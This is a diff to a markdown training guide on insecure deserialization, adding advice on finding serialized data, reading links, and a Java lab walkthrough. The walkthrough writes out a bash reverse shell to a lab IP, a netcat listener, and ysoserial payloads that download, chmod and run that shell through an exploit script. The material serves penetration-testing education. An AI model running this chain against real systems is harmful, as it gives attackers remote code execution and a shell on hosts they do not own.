@@ -1044,27 +1044,43 @@ You can read more about .NET viewstate deserialization in these great articles
 
 ## Other Serialization
 
+Serialization can be spotted in various places of web applications. In addition, each development language has its own deserialization logic and entry points/transportation mechanisms of serialized data.
+
+Less popular language s will result in harder exploitation of deserialization vulnerabilities, since no automated tools, like ysoserial , will exist.
+
+Also, as the aforementioned examples have indicated, deserialization of untrusted data does not necessarily lead to code execution.
+
+Exploitability of untrusted serialized data might often rely on knowing libraries and functions available on the backend. For this purpose, open source software is your friend. You might often be able to view the full code of a target application on e.g. its github repository.
+
+When looking for deserialization vulnerabilities, you should always pay attention to data that:
+
+- Contain strings that are similar to method names or object names
+- Contain binary data
+- Is in a complex, structured form
+
+Don’t forget that if the source code of the target software is available, you should inspect it for the presence of serialization related methods
 
 
 
+Serialization is a language specific topic; thus we will not cover serialization in every language separately. Instead, you might want to check some resources on serialization in other languages and technologies in order to get better grasp on that subject.
+
+Exploiting python based serialization issues is well described in these articles [here](https://intoli.com/blog/dangerous-pickles/) and [here](https://lincolnloop.com/insights/playing-pickle-security/)
 
 
 
+Issues related to Ruby insecure deserialization are well described [here](https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html)
 
 
 
+there’s also a generic presentation that concerns all mentioned technologies [here](https://insomniasec.com/downloads/publications/Deserialization%20-%20%20What%20Could%20Go%20Wrong.pdf) .
+
+Serialization was also issued in SnakeYAML some good writeups are available below:
+
+- [SnakeYaml Deserilization exploited](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858)
 
 
 
-
-
-
-
-
-
-
-
-
+----
 
 ### Labs
 
@@ -1312,15 +1328,97 @@ for command in commands:
 
 
 
-
+----
 
 #### Lab2: Java Insecure Deserialization II
 
+Copy and paste the python exploit code and save it as exploit.py.
+
+**Source:** https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py
 
 
 
+Create a reverse shell payload.
+
+Copy and paste the command into a file and save it as **shell.sh**.
+
+```
+bash -i >& /dev/tcp/192.24.161.2/9999 0>&1
+```
 
 
+
+Setup a Netcat listener that will be listening for connections on port 9999.
+
+```
+nc -lvp 9999
+```
+
+
+
+Host the shell.sh file using a Python SimpleHTTPServer. In the same directory where the file is present, execute the below.
+
+```
+python -m SimpleHTTPServer 8888
+```
+
+ 
+
+Generate a payload with a **ysoserial** file and make the target machine download the shell.sh file from attacker machine.
+
+```
+java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh" > /root/payload.out
+```
+
+
+
+ Execute the python exploit code.
+
+```
+python exploit.py 192.24.161.3 8080 /root/payload.out
+```
+
+This result from the python server shows that shell.sh file is downloaded by the target machine, and the payload is working as expected.
+
+
+
+We have to run the python exploit two more times to execute the bash script in the target machine.
+
+Generate a payload again for making the downloaded shell.sh file executable.
+
+```
+java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "chmod +x /tmp/shell.sh" > /root/payload.out
+```
+
+
+
+Execute the python code again to send the payload for making shell.sh file executable.
+
+```
+python exploit.py 192.24.161.3 8080 /root/payload.out
+```
+
+
+
+Generate a payload for executing the downloaded shell.sh file again.
+
+```
+java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "/bin/bash /tmp/shell.sh" > /root/payload.out
+```
+
+
+
+Execute the python code again to send the payload to the target machine for executing shell.sh file.
+
+```
+python exploit.py 192.24.161.3 8080 /root/payload.out
+```
+
+Open the terminal where the Netcat was listening. The shell should arrive on the Netcat listener.
+
+Check the id by the following command.
+
+----
 
 #### Lab3: PHP Insecure Deserialization
 
@@ -1359,7 +1457,13 @@ because the serialized payload contains characters like `/` and `&` which are tr
 
 To avoid that, we will encode the serialized payload in URL encode.
 
+![](./assets/30.png)
 
+
+
+
+
+----
 
 ### Lab4: .NET Insecure Deserialization
 
